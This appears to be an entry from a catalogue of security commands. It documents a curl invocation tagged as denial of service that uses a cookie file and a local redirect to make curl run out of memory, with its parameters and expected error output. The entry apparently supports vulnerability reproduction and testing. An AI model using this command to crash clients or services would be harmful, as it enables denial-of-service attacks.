---
id: cmd-3
data: >-
  curl -c cookie.txt -b cookie.txt --connect-to
  targetedsite.hax.invalid:80:127.0.0.1:9000 http://targetedsite.hax.invalid/
tags:
  - curl
  - dos
  - memory-exhaustion
type: command
output: >-
  curl: (27) Failed to connect to targetedsite.hax.invalid port 80: Out of
  memory (CURLE_OUT_OF_MEMORY)
executor: bash
platforms:
  - Linux
  - Unix-like
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:37.093Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-dos

## Command

```bash
curl -c cookie.txt -b cookie.txt --connect-to targetedsite.hax.invalid:80:127.0.0.1:9000 http://targetedsite.hax.invalid/
```

## Description

Loads excessive cookies and requests a proxied URL, triggering memory exhaustion in curl due to unlimited domain cookie allocation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-c cookie.txt` | Update cookies in file | Yes |
| `-b cookie.txt` | Load cookies from file | Yes |
| `--connect-to targetedsite.hax.invalid:80:127.0.0.1:9000` | Redirect to local server | Yes |
| `http://targetedsite.hax.invalid/` | Target URL (different subdomain) | Yes |

## Examples

### Basic Usage

```bash
curl -c cookie.txt -b cookie.txt --connect-to targetedsite.hax.invalid:80:127.0.0.1:9000 http://targetedsite.hax.invalid/
```

## Expected Output

CURLE_OUT_OF_MEMORY error as memory exceeds DYN_HTTP_REQUEST limit from loading 256 large cookies.

## Related

- [[Related Procedure|procedures/Trigger-curl-Memory-Exhaustion-with-Excessive-Cookies]]
